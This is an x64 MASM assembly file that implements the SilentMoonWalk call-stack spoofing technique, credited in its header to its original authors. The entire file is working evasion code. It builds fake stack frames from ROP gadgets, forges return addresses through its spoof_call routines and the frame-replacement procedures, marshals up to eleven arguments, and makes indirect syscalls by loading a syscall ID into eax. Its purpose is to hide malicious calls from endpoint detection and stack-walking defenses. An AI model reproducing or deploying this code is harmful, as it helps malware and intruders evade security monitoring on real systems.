; Great portions of the asm code below has been obtained from https://github.com/klezVirus.
; All credits to @KlezVirus @trickster012 @waldoirc and @namazso for developing the original PoC of the SilentMoonWalk technique.
.data

INFO_STRUCT STRUCT
	RtlAddr							DQ 1
	RtlSize							DQ 1
	BaseAddr						DQ 1
	BaseSize						DQ 1
	CurrentSize						DQ 1
	TotalSize						DQ 1
INFO_STRUCT ENDS

SPOOFER STRUCT

	GodGadget						DQ 1
	RtlUnwindAddress				DQ 1
	RtlUnwindTarget					DQ 1
	Stub                           	DQ 1
    FirstFrameFunctionPointer       DQ 1
    SecondFrameFunctionPointer      DQ 1
    JmpRbxGadget                    DQ 1
    AddRspXGadget                   DQ 1

    FirstFrameSize                  DQ 1
    SecondFrameSize                 DQ 1
    JmpRbxGadgetFrameSize           DQ 1
    AddRspXGadgetFrameSize          DQ 1

    StackOffsetWhereRbpIsPushed     DQ 1

    SpoofFunctionPointer            DQ 1
    ReturnAddress                   DQ 1

    Nargs                           DQ 1
    Arg01                           DQ 1
    Arg02                           DQ 1
    Arg03                           DQ 1
    Arg04                           DQ 1
    Arg05                           DQ 1
    Arg06                           DQ 1
    Arg07                           DQ 1
    Arg08                           DQ 1
    Arg09                           DQ 1
    Arg10                           DQ 1
    Arg11                           DQ 1

    Sys                           	DD 0
    SysId                           DD 0

SPOOFER ENDS

.code

get_current_rsp proc
	mov 	rax, rsp
	add 	rax, 8
	ret
get_current_rsp endp

get_current_function_address proc
	mov 	rax, [rsp]
	ret
get_current_function_address endp

start_replacement proc
	mov 	rax, [rsp]
	mov		r11, rsp

	add		r11, 8 ; we discard current return address to get the original rsp value
	push 	rsp
	push 	rbp
	push	r12 ; save nonvolatile registers
	push	r15

	sub 	rsp, [rcx].INFO_STRUCT.RtlSize
	push	[rcx].INFO_STRUCT.RtlAddr
	sub 	rsp, [rcx].INFO_STRUCT.BaseSize
	push	[rcx].INFO_STRUCT.BaseAddr
	sub		rsp,[rcx].INFO_STRUCT.CurrentSize

	mov		r15, rbp
	sub		r15, r11
	mov		r12, rsp
	add		r15, r12
	mov		rbp, r15

prepare_loop:
	mov		r9, 0 ; offset 
start_loop_1:
	mov		r8, r11 ; original rsp
	mov		r12, rsp ; current rsp
	add		r8, r9
	add		r12, r9
	mov		r10, [r8]
	mov		[r12], r10
	add		r9, 8
	cmp		r9, [rcx].INFO_STRUCT.CurrentSize
	je		end_loop_1
	jmp		start_loop_1

end_loop_1:
	jmp		qword ptr rax
start_replacement endp

end_replacement proc
	pop		r14 
	mov		r11, rsp ; original rsp
	mov		r8, [rcx].INFO_STRUCT.TotalSize
	add 	rsp, r8
	pop		r15 ; restore nonvolatile registers
	pop		r12
	pop 	rbp
	pop		rsp
	pop		r9  ; old return address

	mov		r9, 0 ; offset 
start_loop_2:
	mov		r8, r11 ; original rsp
	mov		rdx, rsp ; current rsp
	add		r8, r9
	add		rdx, r9
	mov		r10, [r8]
	mov		[rdx], r10
	add		r9, 8
	cmp		r9, [rcx].INFO_STRUCT.CurrentSize
	je		end_loop_2
	jmp		start_loop_2

end_loop_2:
	jmp		qword ptr r14
end_replacement endp 

spoof_call2 proc

	mov		rax, [rsp]
	mov		r10, [rcx].SPOOFER.ReturnAddress
	mov		[rsp], r10 
	mov		[rsp+08h], rbp 
	mov		[rsp+10h], rbx
	mov		[rsp+18h], rax
	mov		rbp, rsp

	lea		rax, restore2
	push	rax

	lea		rbx, [rsp]
	add		rsp, 8 ; (mis)alignment

	sub		rsp, [rcx].SPOOFER.JmpRbxGadgetFrameSize
	push	[rcx].SPOOFER.JmpRbxGadget
	sub		rsp, [rcx].SPOOFER.AddRspXGadgetFrameSize
	push	[rcx].SPOOFER.AddRspXGadget

	mov		r11, [rcx].SPOOFER.SpoofFunctionPointer
	jmp		parameter_handler
spoof_call2 endp

spoof_call proc

	mov		[rsp+08h], rbp
	mov		[rsp+10h], rbx
	mov		rbp, rsp

	lea		rax, restore
	push	rax

	lea		rbx, [rsp]

	push	[rcx].SPOOFER.FirstFrameFunctionPointer                                     
	
	mov		rax, [rcx].SPOOFER.ReturnAddress
	sub		rax, [rcx].SPOOFER.FirstFrameSize
	
	sub		rsp, [rcx].SPOOFER.SecondFrameSize
	mov		r10, [rcx].SPOOFER.StackOffsetWhereRbpIsPushed
	mov		[rsp+r10], rax 

	push	[rcx].SPOOFER.SecondFrameFunctionPointer

	sub		rsp, [rcx].SPOOFER.JmpRbxGadgetFrameSize
	push	[rcx].SPOOFER.JmpRbxGadget
	sub		rsp, [rcx].SPOOFER.AddRspXGadgetFrameSize
	push	[rcx].SPOOFER.AddRspXGadget

	mov		r11, [rcx].SPOOFER.SpoofFunctionPointer
	jmp		parameter_handler
spoof_call endp
	
restore proc
	mov		rsp, rbp
	mov		rbp, [rsp+08h]
	mov		rbx, [rsp+10h]
	ret
restore endp

restore2 proc
	mov		rsp, rbp
	mov		rbp, [rsp+18h]
	mov		[rsp], rbp
	mov		rbp, [rsp+08h]
	mov		rbx, [rsp+10h]
	ret
restore2 endp

parameter_handler proc
	cmp		[rcx].SPOOFER.Nargs, 11
	je		handle_eleven
	cmp		[rcx].SPOOFER.Nargs, 10
	je		handle_ten
	cmp		[rcx].SPOOFER.Nargs, 9
	je		handle_nine
	cmp		[rcx].SPOOFER.Nargs, 8
	je		handle_eight
	cmp		[rcx].SPOOFER.Nargs, 7
	je		handle_seven
	cmp		[rcx].SPOOFER.Nargs, 6
	je		handle_six
	cmp		[rcx].SPOOFER.Nargs, 5
	je		handle_five
	cmp		[rcx].SPOOFER.Nargs, 4
	je		handle_four
	cmp		[rcx].SPOOFER.Nargs, 3
	je		handle_three
	cmp		[rcx].SPOOFER.Nargs, 2
	je		handle_two
	cmp		[rcx].SPOOFER.Nargs, 1
	je		handle_one
	cmp		[rcx].SPOOFER.Nargs, 0
	je		handle_none
parameter_handler endp

handle_eleven proc
	push	r15
	mov		r15, [rcx].SPOOFER.Arg11
	mov		[rsp+60h], r15
	pop		r15
	jmp		handle_ten
handle_eleven endp
handle_ten proc
	push	r15
	mov		r15, [rcx].SPOOFER.Arg10
	mov		[rsp+58h], r15
	pop		r15
	jmp		handle_nine
handle_ten endp
handle_nine proc
	push	r15
	mov		r15, [rcx].SPOOFER.Arg09
	mov		[rsp+50h], r15
	pop		r15
	jmp		handle_eight
handle_nine endp
handle_eight proc
	push	r15
	mov		r15, [rcx].SPOOFER.Arg08
	mov		[rsp+48h], r15
	pop		r15
	jmp		handle_seven
handle_eight endp
handle_seven proc
	push	r15
	mov		r15, [rcx].SPOOFER.Arg07
	mov		[rsp+40h], r15
	pop		r15
	jmp		handle_six
handle_seven endp
handle_six proc
	push	r15
	mov		r15, [rcx].SPOOFER.Arg06
	mov		[rsp+38h], r15
	pop		r15
	jmp		handle_five
handle_six endp
handle_five proc
	push	r15
	mov		r15, [rcx].SPOOFER.Arg05
	mov		[rsp+30h], r15
	pop		r15
	jmp		handle_four
handle_five endp
handle_four proc
	mov		r9, [rcx].SPOOFER.Arg04
	jmp		handle_three
handle_four endp
handle_three proc
	mov		r8, [rcx].SPOOFER.Arg03
	jmp		handle_two
handle_three endp
handle_two proc
	mov		rdx, [rcx].SPOOFER.Arg02
	jmp		handle_one
handle_two endp
handle_one proc
	cmp		[rcx].SPOOFER.Sys, 0
	jne		execute_syscall
	mov		rcx, [rcx].SPOOFER.Arg01
	jmp		handle_none
handle_one endp

handle_none proc
	jmp		execute
handle_none endp

execute proc
	jmp		qword ptr r11
execute endp

execute_syscall proc
	mov 	r10, [rcx].SPOOFER.Arg01
	mov 	eax, [rcx].SPOOFER.SysId
	mov 	rcx, [rcx].SPOOFER.Arg01
	jmp 	qword ptr r11
execute_syscall endp

end